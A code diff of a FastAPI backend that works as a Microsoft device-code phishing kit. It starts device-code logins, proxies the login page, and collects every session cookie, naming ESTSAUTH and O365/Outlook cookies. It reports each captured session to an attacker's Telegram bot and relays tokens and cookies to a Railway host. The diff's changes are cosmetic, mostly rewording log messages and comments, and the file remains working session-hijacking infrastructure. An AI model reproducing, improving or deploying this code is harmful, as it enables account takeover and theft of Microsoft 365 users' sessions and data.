@@ -16,10 +16,7 @@ app = FastAPI(title="Microsoft Device Code Backend v4.3", version="4.3")
 CLIENT_ID: Optional[str] = os.getenv("MICROSOFT_CLIENT_ID")
 TENANT_ID: str = os.getenv("MICROSOFT_TENANT_ID", "common")
 RELAY_URL: Optional[str] = os.getenv("RELAY_URL")
-SCOPES: list = os.getenv(
-    "SCOPES", 
-    "https://graph.microsoft.com/.default offline_access openid profile"
-).split()
+SCOPES: list = os.getenv("SCOPES", "https://graph.microsoft.com/.default offline_access openid profile").split()
 ENABLE_SESSION_PROXY: bool = os.getenv("ENABLE_SESSION_PROXY", "true").lower() == "true"
 TELEGRAM_BOT_TOKEN: Optional[str] = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID: Optional[str] = os.getenv("TELEGRAM_CHAT_ID")
@@ -36,21 +33,21 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ====================== STARTUP CHECK (Safe for Railway) ======================
+# ====================== STARTUP ======================
 @app.on_event("startup")
 async def startup_event():
     global redis_client
-    
     if not CLIENT_ID:
-        print("❌ CRITICAL ERROR: MICROSOFT_CLIENT_ID is not set in Railway Variables!")
-        print("Please add MICROSOFT_CLIENT_ID and redeploy.")
-        # Do NOT raise here — it crashes Railway. Just log loudly.
-    
+        print("❌ CRITICAL: MICROSOFT_CLIENT_ID is missing in Railway Variables!")
+        print("   Please add it and Redeploy.")
+    else:
+        print("✅ MICROSOFT_CLIENT_ID loaded")
+
     if REDIS_URL:
         redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)
         print("✅ Redis connected")
     else:
-        print("⚠️ No REDIS_URL found — using in-memory sessions")
+        print("⚠️ No REDIS_URL – using in-memory sessions")
 
     print("🚀 Microsoft Device Code Backend started successfully")
 
@@ -74,12 +71,12 @@ async def send_telegram(device_code: str, user_code: str, cookies_count: int):
     if not (TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID):
         return
     try:
-        msg = f"""🔔 <b>New Microsoft Device Session Captured</b>
+        msg = f"""🔔 <b>New Microsoft Session Captured & Relayed</b>
 
 🔑 Device: <code>{device_code[:12]}...</code>
 👤 User code: <code>{user_code}</code>
-🍪 Cookies: <b>{cookies_count}</b>
-✅ Relayed to Railway"""
+🍪 Cookies captured: <b>{cookies_count}</b> (ESTSAUTH, fpc, esctx, O365/Outlook cookies)
+✅ Tokens + cookies sent to Railway"""
         async with httpx.AsyncClient() as c:
             await c.post(
                 f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
@@ -155,7 +152,7 @@ async def poll_for_token(device_code: str):
                 await asyncio.sleep(interval)
 
 
-# ====================== COOKIE PROXY ======================
+# ====================== COOKIE PROXY (Captures ALL cookies including O365/Outlook) ======================
 @app.api_route("/proxy/device-login/{device_code}", methods=["GET", "POST", "HEAD", "OPTIONS"])
 async def advanced_cookie_proxy(device_code: str, request: Request):
     if not ENABLE_SESSION_PROXY:
@@ -178,7 +175,7 @@ async def advanced_cookie_proxy(device_code: str, request: Request):
             params=dict(request.query_params) if request.method == "GET" else None,
         )
 
-    # Capture cookies from all redirects
+    # Capture EVERY cookie from all redirects
     captured = {}
     for past_resp in list(resp.history) + [resp]:
         for header in past_resp.headers.getlist("set-cookie"):
@@ -217,7 +214,7 @@ async def advanced_cookie_proxy(device_code: str, request: Request):
 @app.post("/start-device-auth")
 async def start_device_auth():
     if not CLIENT_ID:
-        raise HTTPException(500, "MICROSOFT_CLIENT_ID is not configured in Railway Variables")
+        raise HTTPException(500, "MICROSOFT_CLIENT_ID is not set in Railway Variables")
     async with httpx.AsyncClient() as client:
         r = await client.post(
             f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode",
@@ -266,7 +263,7 @@ async def health():
 
 @app.get("/")
 async def root():
-    return {"message": "Microsoft Device Code Backend is running. Use your separate frontend."}
+    return {"message": "Backend is running. Use your separate index.html frontend."}
 
 
 if __name__ == "__main__":
